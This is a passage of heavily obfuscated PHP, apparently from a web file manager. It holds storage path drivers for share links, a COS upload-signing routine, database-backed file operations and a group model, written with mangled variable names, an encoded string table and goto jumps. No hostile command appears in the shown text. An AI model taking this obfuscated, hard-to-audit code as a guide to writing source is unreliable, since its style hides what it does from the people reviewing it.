KodIO::clear($this->pathParse[$ùÑ”‡ó¶[496]][$ùÑ”‡ó¶[1173]]); $ÂøÁ×Ÿè = substr($¿şœ«¶, strlen($â·á¼¼¤)); if (substr($¿şœ«¶, 0, strlen($â·á¼¼¤)) != $â·á¼¼¤) { return !1; } return $this->pathParse[$ùÑ”‡ó¶[1167]] . $ùÑ”‡ó¶[18] . ltrim($ÂøÁ×Ÿè, $ùÑ”‡ó¶[18]); } public function getType() { $–Ç€£© =& $_SERVER[¹Û¹Æ€]; $–†ı…Ë¶ = str_replace($–Ç€£©[84], $–Ç€£©[22], get_class($this)); return strtolower($–†ı…Ë¶); } public function isTypeObject($‡é¼ÜóŸ) { return IO::isTypeObject($‡é¼ÜóŸ); } public function info($•·×äêÙ) { return $this->infoParse($•·×äêÙ); } public function infoAuth($ò¡˜†¯À) { return $this->infoParse($ò¡˜†¯À); } public function infoWithChildren($¤ã•ô‚) { return $this->infoParse($¤ã•ô‚, !0); } public function infoFull($‚¡Í¤£) { return $this->infoParse($‚¡Í¤£); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ö¿Û«æ´) { $this->pathParse = $Ö¿Û«æ´; } protected function infoParse($ş˜ñ¨, $±ä«Á£ = false) { $Ú´ËÒœÍ =& $_SERVER[¹Û¹Æ€]; return Action($Ú´ËÒœÍ[1172])->sharePathInfo($this->pathParse[$Ú´ËÒœÍ[94]], !0, $±ä«Á£); } public function listPath($ÆôÎ¶ËÌ, $û“š® = false) { $ƒõÏ—‰Å =& $_SERVER[¹Û¹Æ€]; $•öÀ¿“ş = IO::listPath($ÆôÎ¶ËÌ, $û“š®); if (!$•öÀ¿“ş) { return $•öÀ¿“ş; } if (is_array($•öÀ¿“ş[$ƒõÏ—‰Å[1342]])) { $¶·¬ÉÈ = Action($ƒõÏ—‰Å[1351])->parsePathChildren($•öÀ¿“ş[$ƒõÏ—‰Å[1342]], array($ƒõÏ—‰Å[430] => $ÆôÎ¶ËÌ)); $•öÀ¿“ş[$ƒõÏ—‰Å[1342]] = Action($ƒõÏ—‰Å[1172])->shareItemInfo($¶·¬ÉÈ); } foreach ($•öÀ¿“ş as $×ÙÉ²ïŞ => $Å¿Ì„“) { if (!in_array($×ÙÉ²ïŞ, array($ƒõÏ—‰Å[93], $ƒõÏ—‰Å[92]))) { continue; } foreach ($Å¿Ì„“ as $€­”áÓ¯ => $¶·¬ÉÈ) { $¶·¬ÉÈ = Action($ƒõÏ—‰Å[1351])->parsePathChildren($¶·¬ÉÈ, array($ƒõÏ—‰Å[430] => $ÆôÎ¶ËÌ)); $•öÀ¿“ş[$×ÙÉ²ïŞ][$€­”áÓ¯] = Action($ƒõÏ—‰Å[1172])->shareItemInfo($¶·¬ÉÈ); } } return $•öÀ¿“ş; } public function listAll($¯Êì›œŸ) { $‡–¦æâØ =& $_SERVER[¹Û¹Æ€]; $ıä­¼¹Ù = IO::listAll($¯Êì›œŸ); foreach ($ıä­¼¹Ù as &$¡œ›­) { $¿»‰œö× = IO::info($¡œ›­[$‡–¦æâØ[94]]); $¿»‰œö× = is_array($¿»‰œö×) ? $¿»‰œö× : array(); $¡œ›­ = array_merge($¿»‰œö×, $¡œ›­); $¡œ›­[$‡–¦æâØ[96]] = Action($‡–¦æâØ[1172])->shareItemInfo($¡œ›­); } unset($¡œ›­); return $ıä­¼¹Ù; } } goto A¸¯Ï áÓÚ; Cîˆ¿µ‘’Ö: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($àÖµş†û) { parent::__construct($àÖµş†û); $this->signatureVersion($_SERVER[¹Û¹Æ€][226]); } public function uploadFormData($ÅÀ¸Ã­ß, $ãÀ«òœê = 3600) { $ç°ŞÏÓ =& $_SERVER[¹Û¹Æ€]; $•Ğ´°Ğ¡ = $ç°ŞÏÓ[208]; $ô«“É½ = $ç°ŞÏÓ[241]; $ğÓ÷³ë = $ç°ŞÏÓ[1316]; $ò¢¾Û£Ç = gmdate($ç°ŞÏÓ[1317], time() + $ãÀ«òœê); $†Œïœˆ = (string) time() . $ç°ŞÏÓ[81] . (string) (time() + $ãÀ«òœê); $î»è€£½ = array($ç°ŞÏÓ[1318] => $ò¢¾Û£Ç, $ç°ŞÏÓ[1319] => array(array($ç°ŞÏÓ[1320] => $•Ğ´°Ğ¡), array($ç°ŞÏÓ[1321] => $this->bucket), array($ç°ŞÏÓ[1322], $ç°ŞÏÓ[1323], $ç°ŞÏÓ[22]), array($ç°ŞÏÓ[1324] => $ğÓ÷³ë), array($ç°ŞÏÓ[1325] => $ô«“É½), array($ç°ŞÏÓ[1326] => $this->accessKey), array($ç°ŞÏÓ[1327] => $†Œïœˆ))); $î»è€£½ = json_encode($î»è€£½); $„´®´ÙĞ = hash_hmac($ç°ŞÏÓ[241], $†Œïœˆ, $this->secret); $Ê“º = sha1($î»è€£½); $ïúŸê¨¿ = hash_hmac($ç°ŞÏÓ[241], $Ê“º, $„´®´ÙĞ); $ÆãÑÉÚÇ = array($ç°ŞÏÓ[1320] => $•Ğ´°Ğ¡, $ç°ŞÏÓ[1324] => $ğÓ÷³ë, $ç°ŞÏÓ[1328] => base64_encode($î»è€£½), $ç°ŞÏÓ[1325] => $ô«“É½, $ç°ŞÏÓ[1326] => $this->accessKey, $ç°ŞÏÓ[1329] => $†Œïœˆ, $ç°ŞÏÓ[1330] => $ïúŸê¨¿, $ç°ŞÏÓ[191] => $this->getHost()); return $ÆãÑÉÚÇ; } public function fileOutLink($Æ‚¶ÈÎÈ) { $ıŠáÕÂ½ =& $_SERVER[¹Û¹Æ€]; if (substr($Æ‚¶ÈÎÈ, 0, 7) == $ıŠáÕÂ½[1331]) { $Æ‚¶ÈÎÈ = $ıŠáÕÂ½[1332] . substr($Æ‚¶ÈÎÈ, 7); } header($ıŠáÕÂ½[171] . $Æ‚¶ÈÎÈ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($½á¨³ÏË) { $this->pathParse = $½á¨³ÏË; $this->model = Model($_SERVER[¹Û¹Æ€][1333]); } public function getPath($‹°ÕÚµÒ) { return trim($‹°ÕÚµÒ, $_SERVER[¹Û¹Æ€][18]); } public function pathFather($¹ÄóÓ©­) { $ğ«²ï©­ = $this->parse($¹ÄóÓ©­); $ğ«²ï©­ = $this->infoSimple($¹ÄóÓ©­); return $ğ«²ï©­ ? $ğ«²ï©­[$_SERVER[¹Û¹Æ€][441]] : !1; } public function pathThis($’×äªÒ) { $Ò‰µô‚ = $this->infoSimple($’×äªÒ); return $Ò‰µô‚ ? $Ò‰µô‚[$_SERVER[¹Û¹Æ€][42]] : !1; } public function getPathOuter($Ì±º…„˜) { if (!$Ì±º…„˜) { return $Ì±º…„˜; } $ÁÒ‡ñ€£ = $this->parse($Ì±º…„˜); return KodIO::make($ÁÒ‡ñ€£[$_SERVER[¹Û¹Æ€][408]]); } public function copyFolderFromIO($š£°ãó, $¦›ıóæÈ, $¨¼¿âËÌ, $•®Ûîêë, $öéŒãà) { $ùëéÃşí = $this->model->copyFolderFromIO($š£°ãó, $¦›ıóæÈ, $¨¼¿âËÌ, $•®Ûîêë, $öéŒãà); return KodIO::make($ùëéÃşí); } public function isParentOf($¢¾ß—”¶, $“„æ°ªŒ) { return $this->model->isParentOf($¢¾ß—”¶, $“„æ°ªŒ); } public function mkfile($ïùªÉÜ¯, $ùà¿Ä×† = '', $ôçòœµ€ = REPEAT_RENAME) { $Œ–Ö¿²… =& $_SERVER[¹Û¹Æ€]; $ã‚µÂç÷ = $this->parse($ïùªÉÜ¯); $ïùªÉÜ¯ = $ã‚µÂç÷[$Œ–Ö¿²…[408]]; for ($¡ïÈÇÃŒ = 0; $¡ïÈÇÃŒ < count($ã‚µÂç÷[$Œ–Ö¿²…[1334]]); $¡ïÈÇÃŒ++) { $²ëæíŠ½ = $ã‚µÂç÷[$Œ–Ö¿²…[1334]][$¡ïÈÇÃŒ]; if ($¡ïÈÇÃŒ == count($ã‚µÂç÷[$Œ–Ö¿²…[1334]]) - 1) { $ïùªÉÜ¯ = $this->model->mkfile($ïùªÉÜ¯, $²ëæíŠ½, $ùà¿Ä×†, $ôçòœµ€); break; } $ïùªÉÜ¯ = $this->model->mkdir($ïùªÉÜ¯, $²ëæíŠ½, REPEAT_SKIP); } return $this->getPathOuter($ïùªÉÜ¯); } public function mkdir($ßù‚÷¤ƒ, $šĞ³ = REPEAT_SKIP) { $¿Šîëˆ¥ =& $_SERVER[¹Û¹Æ€]; $üñšÕŸ¬ = $this->parse($ßù‚÷¤ƒ); $ßù‚÷¤ƒ = $üñšÕŸ¬[$¿Šîëˆ¥[408]]; for ($ïïßİÂ¾ = 0; $ïïßİÂ¾ < count($üñšÕŸ¬[$¿Šîëˆ¥[1334]]); $ïïßİÂ¾++) { $§ò‰›ç = $üñšÕŸ¬[$¿Šîëˆ¥[1334]][$ïïßİÂ¾]; $ßù‚÷¤ƒ = $this->model->mkdir($ßù‚÷¤ƒ, $§ò‰›ç, $šĞ³); } return $this->getPathOuter($ßù‚÷¤ƒ); } public function copyFile($›¯¶ß, $Ö²ŒÃ™û, $Ãğ‡¿Ø = REPEAT_REPLACE) { $¨Ğ‰º¦ =& $_SERVER[¹Û¹Æ€]; $ßÆ…ßÂÒ = $this->parse($Ö²ŒÃ™û); $‰¾¢Í©Ù = $this->model->copy($›¯¶ß, $ßÆ…ßÂÒ[$¨Ğ‰º¦[408]], $Ãğ‡¿Ø, $ßÆ…ßÂÒ[$¨Ğ‰º¦[94]]); return $‰¾¢Í©Ù ? $this->getPathOuter($‰¾¢Í©Ù) : !1; } public function moveFile($¼–´íùÙ, $–„§°ºÇ, $Ÿ½÷¼ã³ = REPEAT_REPLACE) { $æ¤ß€– =& $_SERVER[¹Û¹Æ€]; $† ÉÂÒê = $this->parse($–„§°ºÇ); $Ùà¨¶Å¡ = $this->model->move($¼–´íùÙ, $† ÉÂÒê[$æ¤ß€–[408]], $Ÿ½÷¼ã³, $† ÉÂÒê[$æ¤ß€–[94]]); return $Ùà¨¶Å¡ ? $this->getPathOuter($Ùà¨¶Å¡) : !1; } public function copy($¹¨¨í, $âíŸÑ¥Ú, $ÅÖ€úÉ° = REPEAT_REPLACE, $öÅ·ƒ = false) { $ç‡×®¥¼ = $this->parse($âíŸÑ¥Ú); $îªØñÇÉ = $this->model->copy($¹¨¨í, $ç‡×®¥¼[$_SERVER[¹Û¹Æ€][408]], $ÅÖ€úÉ°, $öÅ·ƒ); return $îªØñÇÉ ? $this->getPathOuter($îªØñÇÉ) : !1; } public function moveSameAllow() { } public function move($Ş¬üÊı, $Ÿ‚±Ë˜‘, $ºˆ­Â¥ó = REPEAT_REPLACE, $’„¸ìš– = false) { $ÆÃåì¨© = $this->parse($Ÿ‚±Ë˜‘); $¯›¹ÂÏ÷ = $this->model->move($Ş¬üÊı, $ÆÃåì¨©[$_SERVER[¹Û¹Æ€][408]], $ºˆ­Â¥ó, $’„¸ìš–); return $¯›¹ÂÏ÷ ? $this->getPathOuter($¯›¹ÂÏ÷) : !1; } public function remove($½è‹¢¨ß, $ÉŒÈàçë = true) { return $this->model->remove($½è‹¢¨ß, $ÉŒÈàçë); } public function rename($áÆ®‚êü, $•Æß±¡) { $ñ®±·ˆ = $this->model->rename($áÆ®‚êü, $•Æß±¡); return $ñ®±·ˆ ? $this->getPathOuter($áÆ®‚êü) : $ñ®±·ˆ; } public function size($ÀÃá®Üê) { $³†Ó¼´ = $this->infoSimple($ÀÃá®Üê); return $³†Ó¼´ ? $³†Ó¼´[$_SERVER[¹Û¹Æ€][86]] : 0; } public function infoSimple($ìÛŸÏù) { return $this->model->sourceInfo($ìÛŸÏù); } public function info($«®á÷â) { return $this->infoParse($«®á÷â); } public function infoAuth($ŠÓö·Ç) { return $this->infoParse($ŠÓö·Ç, !1, !0); } public function infoWithChildren($à¨´×í¹) { return $this->infoParse($à¨´×í¹, !0); } protected function infoParse($ª·Åµª˜, $œ‚×ÎŸ‡ = false, $”‰õ¬è = false) { if (!$œ‚×ÎŸ‡) { return $this->model->pathInfo($ª·Åµª˜, $”‰õ¬è); } return $this->model->pathInfoMore($ª·Åµª˜); } public function infoFull($±à­“Â³) { $é½÷õ‹ =& $_SERVER[¹Û¹Æ€]; $»ñ¢”ı = explode($é½÷õ‹[18], $±à­“Â³); $É¢è“Ï = implode($é½÷õ‹[18], array_splice($»ñ¢”ı, 1)); return $this->model->pathInfoByPath($»ñ¢”ı[0], $É¢è“Ï); } public function hashSimple($¤Ñ¦ªøî) { $òÌ®·—ª =& $_SERVER[¹Û¹Æ€]; $²Ãâ¤”à = $this->infoWithChildren($¤Ñ¦ªøî); return $²Ãâ¤”à[$òÌ®·—ª[180]][$òÌ®·—ª[187]]; } public function hashMd5($°ÄáÕ÷) { $‹Á€‘ =& $_SERVER[¹Û¹Æ€]; $¿’¿’íÂ = $this->infoWithChildren($°ÄáÕ÷); return $¿’¿’íÂ[$‹Á€‘[180]][$‹Á€‘[186]]; } public function exist($—ïÖÉßô) { $«¾”½ÀŞ =& $_SERVER[¹Û¹Æ€]; $€ıšå†¯ = $this->parse($—ïÖÉßô); if (!$€ıšå†¯[$«¾”½ÀŞ[94]]) { return $this->isFile($—ïÖÉßô) || $this->isFolder($—ïÖÉßô); } $ë¥œÀî¾ = array($«¾”½ÀŞ[410] => $€ıšå†¯[$«¾”½ÀŞ[408]], $«¾”½ÀŞ[42] => $€ıšå†¯[$«¾”½ÀŞ[94]]); $¥¡ãŞ = $this->model->where($ë¥œÀî¾)->find(); return $¥¡ãŞ ? !0 : !1; } public function isFile($¡‚æÑé ) { $‚·‹®ê =& $_SERVER[¹Û¹Æ€]; $ñ¸¥ú­Ò = $this->infoSimple($¡‚æÑé ); return $ñ¸¥ú­Ò && $ñ¸¥ú­Ò[$‚·‹®ê[419]] == $‚·‹®ê[98] ? !1 : !0; } public function isFolder($…—Õì¿Õ) { $ªËÙœ…› =& $_SERVER[¹Û¹Æ€]; $ÖØœŞÃ– = $this->infoSimple($…—Õì¿Õ); return $ÖØœŞÃ– && $ÖØœŞÃ–[$ªËÙœ…›[419]] == $ªËÙœ…›[98] ? !0 : !1; } public function listPath($¥ãê‹º£, $¤º‡¯Ã© = false) { $İˆ­­éâ =& $_SERVER[¹Û¹Æ€]; if ($¥ãê‹º£ == $İˆ­­éâ[22]) { return !1; } $¶³± ñÉ = array($İˆ­­éâ[410] => $¥ãê‹º£); if ($¤º‡¯Ã©) { return $this->model->listSource($¶³± ñÉ, -1); } return $this->model->listSource($¶³± ñÉ); } public function has($¢ÕÛÊÙ, $™¨ä¤¥ = false, $§Œ¤¹œõ = null) { $ƒ”ñÜáï =& $_SERVER[¹Û¹Æ€]; $ª¦í·éù = $this->infoWithChildren($¢ÕÛÊÙ); if ($™¨ä¤¥) { return array($ƒ”ñÜáï[218] => $ª¦í·éù[$ƒ”ñÜáï[218]], $ƒ”ñÜáï[217] => $ª¦í·éù[$ƒ”ñÜáï[217]]); } return $§Œ¤¹œõ ? $ª¦í·éù[$ƒ”ñÜáï[218]] : $ª¦í·éù[$ƒ”ñÜáï[217]]; } public function listAll($ûØ£†) { $ƒî”à‰˜ = IO::info($this->pathParse[$_SERVER[¹Û¹Æ€][94]]); if (!$ƒî”à‰˜) { return array(); } return $this->model->listAll($ûØ£†); } public function getContent($Ó®Û—»±) { return $this->model->getContent($Ó®Û—»±); } public function setContent($ÊÇ¨å£, $Ò‡èÊÉœ = '') { return $this->model->setContent($ÊÇ¨å£, $Ò‡èÊÉœ); } public function fileSubstr($ÆÎôÕ, $Œ¥Ü¬áŒ, $åÔô˜˜…) { return $this->model->fileSubstr($ÆÎôÕ, $Œ¥Ü¬áŒ, $åÔô˜˜…); } public function download($Ü§Çé—, $¤¡óÅÀ = '') { $Æ¨‰ñ÷‰ = get_path_father($¤¡óÅÀ); $®ªäÆ€¨ = get_path_this($¤¡óÅÀ); $Ç Àæé€ = $this->model->fileInfoGet($Ü§Çé—); $ü¿’ÖÏˆ = IO::copy($Ç Àæé€[$_SERVER[¹Û¹Æ€][94]], $Æ¨‰ñ÷‰, !1, $®ªäÆ€¨); return $ü¿’ÖÏˆ; } public function setModifyTime($‹º‰ô÷, $äş¶ˆ”¼ = '') { $Ú»Èğ§ =& $_SERVER[¹Û¹Æ€]; if (!$‹º‰ô÷) { return; } $this->model->where(array($Ú»Èğ§[426] => $‹º‰ô÷))->save(array($Ú»Èğ§[95] => $äş¶ˆ”¼)); } public function upload($ÙÌöŠš, $ÌÆçööÛ, $’Ñ®ˆŒ÷ = false, $¸ÓŒº© = REPEAT_REPLACE) { $¶ö“Ä£ï =& $_SERVER[¹Û¹Æ€]; $îÛÒˆ„ = $this->parse($ÙÌöŠš); $çìöÎ¢ = $this->model->addFile($îÛÒˆ„[$¶ö“Ä£ï[408]], $ÌÆçööÛ, $îÛÒˆ„[$¶ö“Ä£ï[94]], $’Ñ®ˆŒ÷, $¸ÓŒº©); return $this->getPathOuter($çìöÎ¢); } public function uploadFileByID($ìü¹ıÇÕ, $ø¹ššˆá, $ˆ°ü›¿¹) { $¶ôõçÇ =& $_SERVER[¹Û¹Æ€]; $ó¡©½ï‰ = $this->parse($ìü¹ıÇÕ); $¼²»«° = $this->model->addFileByFileID($ó¡©½ï‰[$¶ôõçÇ[408]], $ø¹ššˆá, $ó¡©½ï‰[$¶ôõçÇ[94]], $ˆ°ü›¿¹); return $this->getPathOuter($¼²»«°); } public function addFileByRemote($®ƒàÉİ, $Óé÷©²µ, $£ï€„¯‘ = array(), $¤Ğ››Œ = '', $¼â€«‰‚) { $ä¬œÎñç =& $_SERVER[¹Û¹Æ€]; $Æ©ƒÒı = $this->parse($®ƒàÉİ); $¤Ğ››Œ = empty($¤Ğ››Œ) ? $Æ©ƒÒı[$ä¬œÎñç[94]] : $¤Ğ››Œ; $¤ë¬®Ê = $this->model->addFileByRemote($Æ©ƒÒı[$ä¬œÎñç[408]], $Óé÷©²µ, $¤Ğ››Œ, $£ï€„¯‘, $¼â€«‰‚); return $this->getPathOuter($¤ë¬®Ê); } public function uploadLink($Õ²Ö¦ª, $ê‡á‚Ä— = 0) { $Ï­‹÷Õ =& $_SERVER[¹Û¹Æ€]; $¦¥ŸŒù² = $this->parse($Õ²Ö¦ª); $ÑˆòÁÓ = _get($GLOBALS[$Ï­‹÷Õ[17]], $Ï­‹÷Õ[1335]); $ÆãæŒÛ‘ = _get($GLOBALS[$Ï­‹÷Õ[17]], $Ï­‹÷Õ[1336]); $Õ²Ö¦ª = Model($Ï­‹÷Õ[618])->createFileName($¦¥ŸŒù²[$Ï­‹÷Õ[94]], $ÑˆòÁÓ, $ÆãæŒÛ‘); return IO::uploadLink($Õ²Ö¦ª, $ê‡á‚Ä—); } public function fileNameAuto($­÷ßçõ¨, $ïÍ²·ó, $æÒ š™Î = REPEAT_REPLACE, $¡ŒÔä¡Œ = false) { return $this->model->fileNameAuto($­÷ßçõ¨, $ïÍ²·ó, $æÒ š™Î, $¡ŒÔä¡Œ); } public function fileNameExist($ÀÇü¦­ò, $¾ß©“®) { return $this->model->fileNameExist($ÀÇü¦­ò, $¾ß©“®); } protected function _fileOut($¢³çêøå, $Ï·ãûçš = false, $äèŒÚĞÃ = false, $í¨À²‚æ = '', $üƒÌ¼öä = false) { $ÍÃ”Êöæ =& $_SERVER[¹Û¹Æ€]; $”ñ³Ê’¦ = $this->model->sourceInfo($¢³çêøå); if ($”ñ³Ê’¦[$ÍÃ”Êöæ[419]] == $ÍÃ”Êöæ[98]) { header($ÍÃ”Êöæ[1337]); die; } $‚™ÇËö¥ = $this->model->fileInfoGet($¢³çêøå); $í¨À²‚æ = $‚™ÇËö¥[$ÍÃ”Êöæ[186]] ? $‚™ÇËö¥[$ÍÃ”Êöæ[186]] : $í¨À²‚æ; $š„”êÀ = isset($GLOBALS[$ÍÃ”Êöæ[1338]]) ? $GLOBALS[$ÍÃ”Êöæ[1338]] : $”ñ³Ê’¦[$ÍÃ”Êöæ[42]]; if ($üƒÌ¼öä) { return IO::fileOutServer($‚™ÇËö¥[$ÍÃ”Êöæ[94]], $Ï·ãûçš, $š„”êÀ, $í¨À²‚æ); } IO::fileOut($‚™ÇËö¥[$ÍÃ”Êöæ[94]], $Ï·ãûçš, $š„”êÀ, $í¨À²‚æ); } public function fileOut($Ú°çïÔû, $˜¯—‡Á = false, $é•–Ã° = false, $Éšş‡¦İ = '') { $this->_fileOut($Ú°çïÔû, $˜¯—‡Á, $é•–Ã°, $Éšş‡¦İ); } public function fileOutServer($Ø€Úåçõ, $ŞÕï¿îÅ = false, $õİúŒı¡ = false, $º¾å·İŞ = '') { $this->_fileOut($Ø€Úåçõ, $ŞÕï¿îÅ, $õİúŒı¡, $º¾å·İŞ, !0); } protected function _fileOutImage($ôâ²º³Ó, $©µ—ä† = 250) { $õí‘’¢ =& $_SERVER[¹Û¹Æ€]; $ÁíÇï = $this->model->pathInfo($ôâ²º³Ó); if ($ÁíÇï[$õí‘’¢[419]] == $õí‘’¢[98]) { show_json($õí‘’¢[1339] . $ôâ²º³Ó, !1); } $úïÔıñÎ = $this->model->fileInfoGet($ôâ²º³Ó); $úïÔıñÎ[$õí‘’¢[42]] = $ÁíÇï[$õí‘’¢[42]]; $úïÔıñÎ[$õí‘’¢[179]] = $ÁíÇï[$õí‘’¢[179]]; $GLOBALS[$õí‘’¢[1338]] = $úïÔıñÎ[$õí‘’¢[42]]; $GLOBALS[$õí‘’¢[178]] = $úïÔıñÎ; IO::fileOutImage($úïÔıñÎ[$õí‘’¢[94]], $©µ—ä†); } public function fileOutImage($ô«é ª, $áó‡¦Œ™ = 250) { $this->_fileOutImage($ô«é ª, $áó‡¦Œ™); } public function fileOutImageServer($ˆËÇÊÕ¾, $©­ÄÕÎ = 250) { $this->_fileOutImage($ˆËÇÊÕ¾, $©­ÄÕÎ); } public function link($‚ƒ†±±·, $ˆ‡±˜” = '') { $„íÕª = $this->model->fileInfoGet($‚ƒ†±±·); return IO::link($„íÕª[$_SERVER[¹Û¹Æ€][94]], $ˆ‡±˜”); } protected function parse($¢µƒ‚óµ) { $êîıü—Ê =& $_SERVER[¹Û¹Æ€]; if (strstr($¢µƒ‚óµ, $êîıü—Ê[18]) === !1) { return array($êîıü—Ê[428] => intval($¢µƒ‚óµ), $êîıü—Ê[94] => $êîıü—Ê[22], $êîıü—Ê[1334] => array()); } $ÆæÂ¥Ã— = explode($êîıü—Ê[18], trim($¢µƒ‚óµ, $êîıü—Ê[18])); if (count($ÆæÂ¥Ã—) < 2) { show_tips(clear_html($¢µƒ‚óµ) . $êîıü—Ê[1340]); } return array($êîıü—Ê[428] => intval($ÆæÂ¥Ã—[0]), $êîıü—Ê[94] => $ÆæÂ¥Ã—[1], $êîıü—Ê[1334] => array_slice($ÆæÂ¥Ã—, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($óäÅ†ÖÌ) { $this->pathParse = $óäÅ†ÖÌ; $this->model = Model($_SERVER[¹Û¹Æ€][1333]); } public function getPathOuter($¢â¶½¸) { $Û”ıŠö± =& $_SERVER[¹Û¹Æ€]; if (!$¢â¶½¸) { return $¢â¶½¸; } $®¼æşŒÆ = $this->parse($¢â¶½¸); return trim(KodIO::makeShare($this->pathParse[$Û”ıŠö±[408]], $®¼æşŒÆ[$Û”ıŠö±[408]]), $Û”ıŠö±[18]); } protected function infoParse($ş¸ğˆ, $×à¯ñ¾Š = false, $À†³õ¶¾ = false) { $Æş´×ÑÖ =& $_SERVER[¹Û¹Æ€]; $ÎŞá‹Øï = $this->pathParse[$Æş´×ÑÖ[408]]; $ï¤¿åíİ = trim($this->pathParse[$Æş´×ÑÖ[1166]], $Æş´×ÑÖ[18]); return Action($Æş´×ÑÖ[1341])->sharePathInfo($ÎŞá‹Øï, $ï¤¿åíİ, $×à¯ñ¾Š); } public function infoFull($õ«áÉ™î) { $ç€Ôì÷ =& $_SERVER[¹Û¹Æ€]; $§ÏŞéú† = explode($ç€Ôì÷[18], trim($õ«áÉ™î, $ç€Ôì÷[18])); if (count($§ÏŞéú†) > 1) { $ßÕæ¬§ = implode($ç€Ôì÷[18], array_splice($§ÏŞéú†, 1)); $–„çøŒš = $this->model->pathInfoByPath($§ÏŞéú†[0], $ßÕæ¬§); if (!$–„çøŒš) { return !1; } $this->pathParse[$ç€Ôì÷[1166]] = $–„çøŒš[$ç€Ôì÷[411]]; } return $this->infoParse($õ«áÉ™î); } public function listAll($„ĞÆó) { $²ÄÄ‹–¤ =& $_SERVER[¹Û¹Æ€]; $°™ÇİˆÉ = IO::info($this->pathParse[$²ÄÄ‹–¤[94]]); if (!$°™ÇİˆÉ) { return array(); } $÷ßÚ½çî = $this->model->listAll($„ĞÆó); $Îñí´æ¿ = Model($²ÄÄ‹–¤[610])->getInfo($°™ÇİˆÉ[$²ÄÄ‹–¤[498]]); $ŠÅñ±¿ = Action($²ÄÄ‹–¤[1341]); foreach ($÷ßÚ½çî as &$ìÜÊÓï) { check_abort(); $ìÜÊÓï[$²ÄÄ‹–¤[96]] = $ŠÅñ±¿->_shareItemeParse($ìÜÊÓï[$²ÄÄ‹–¤[96]], $Îñí´æ¿); } unset($ìÜÊÓï); return $÷ßÚ½çî; } } goto cÜèòËî³å; ešÚŸ”õí: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\x65" => "\x67\162\157\165\160\137\x6d\145\164\141", "\x6d\145\x74\x61\106\151\145\x6c\x64" => "\147\162\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($œ¦¾«Ä») { $Ú¦»ü =& $_SERVER[¹Û¹Æ€]; return array($Ú¦»ü[1927] => array($œ¦¾«Ä»[0], $Ú¦»ü[1928]), $Ú¦»ü[1929] => array($œ¦¾«Ä»[0], $Ú¦»ü[1930])); } protected function getInfo($„û‹Ø˜, $ô¼•à® = false) { $­×Ö§üß = $this->getInfoSimple($„û‹Ø˜); if (!$­×Ö§üß) { return !1; } if ($ô¼•à®) { return $this->_listDataApplyItem($­×Ö§üß); } return $this->cacheFunctionGet($_SERVER[¹Û¹Æ€][1931], $„û‹Ø˜); } protected function getInfoSimple($½ƒ’á¦†, $Ó˜ªÕµï = false) { $á”Û’ =& $_SERVER[¹Û¹Æ€]; if ($Ó˜ªÕµï) { $ñ²¼›‡ = array($á”Û’[1849] => intval($½ƒ’á¦†)); $‹ıÂ˜æœ = $this->where($ñ²¼›‡)->find(); return is_array($‹ıÂ˜æœ) ? $‹ıÂ˜æœ : array(); } return $this->cacheFunctionGet($á”Û’[1932], $½ƒ’á¦†); } protected function groupAdd($½ã¬›²¯) { $™×¥Ü¹ =& $_SERVER[¹Û¹Æ€]; if (!$½ã¬›²¯[$™×¥Ü¹[441]] && isset($½ã¬›²¯[$™×¥Ü¹[1849]]) && $½ã¬›²¯[$™×¥Ü¹[1849]] == 1) { if ($“‘ò•Ö” = $this->getInfoSimple($½ã¬›²¯[$™×¥Ü¹[1849]], !0)) { return $½ã¬›²¯[$™×¥Ü¹[1849]]; } } else { $“‘ò•Ö” = $this->getInfoSimple($½ã¬›²¯[$™×¥Ü¹[441]]); if (!$“‘ò•Ö”) { return !1; } } $¦¯ùª“¼ = $™×¥Ü¹[540]; if ($“‘ò•Ö”[$™×¥Ü¹[530]]) { $¦¯ùª“¼ = $“‘ò•Ö”[$™×¥Ü¹[530]] . $“‘ò•Ö”[$™×¥Ü¹[1849]] . $™×¥Ü¹[60]; } $õˆ¥Ê½ˆ = array($™×¥Ü¹[429] => $this->groupNameAuto($½ã¬›²¯[$™×¥Ü¹[441]], $½ã¬›²¯[$™×¥Ü¹[42]]), $™×¥Ü¹[410] => $½ã¬›²¯[$™×¥Ü¹[441]], $™×¥Ü¹[599] => $¦¯ùª“¼, $™×¥Ü¹[1933] => $½ã¬›²¯[$™×¥Ü¹[1836]], $™×¥Ü¹[1934] => 0, $™×¥Ü¹[1853] => 0); if (isset($½ã¬›²¯[$™×¥Ü¹[1873]])) { $õˆ¥Ê½ˆ[$™×¥Ü¹[1873]] = $½ã¬›²¯[$™×¥Ü¹[1873]]; } else { $¥¿ŞúæÃ = $this->max($™×¥Ü¹[1873]); if (!$¥¿ŞúæÃ) { $¥¿ŞúæÃ = 0; } $õˆ¥Ê½ˆ[$™×¥Ü¹[1873]] = $¥¿ŞúæÃ + 1; } if (!empty($½ã¬›²¯[$™×¥Ü¹[1849]])) { $õˆ¥Ê½ˆ[$™×¥Ü¹[1849]] = $½ã¬›²¯[$™×¥Ü¹[1849]]; } $ß¿Ö‰Úº = $this->add($õˆ¥Ê½ˆ); $this->setNamePinyin($ß¿Ö‰Úº, $õˆ¥Ê½ˆ[$™×¥Ü¹[42]]); if (isset($½ã¬›²¯[$™×¥Ü¹[1935]])) { $this->metaSet($ß¿Ö‰Úº, array($™×¥Ü¹[1935] => $½ã¬›²¯[$™×¥Ü¹[1935]], $™×¥Ü¹[1936] => $½ã¬›²¯[$™×¥Ü¹[1936]])); unset($½ã¬›²¯[$™×¥Ü¹[1935]]); unset($½ã¬›²¯[$™×¥Ü¹[1936]]); } Model($™×¥Ü¹[1333])->groupRootAdd($ß¿Ö‰Úº); return $ß¿Ö‰Úº; } protected function groupEdit($Ğû¸»È”, $¢Åƒú‰) { $«èÕõÌŞ =& $_SERVER[¹Û¹Æ€]; $À˜®´°ë = $this->getInfoSimple($Ğû¸»È”); if (!$À˜®´°ë) { return !1; } if (!empty($¢Åƒú‰[$«èÕõÌŞ[441]])) { $›ç¼ª• = $this->getInfoSimple($¢Åƒú‰[$«èÕõÌŞ[441]]); if (!$›ç¼ª•) { return !1; } if ($À˜®´°ë[$«èÕõÌŞ[1849]] == 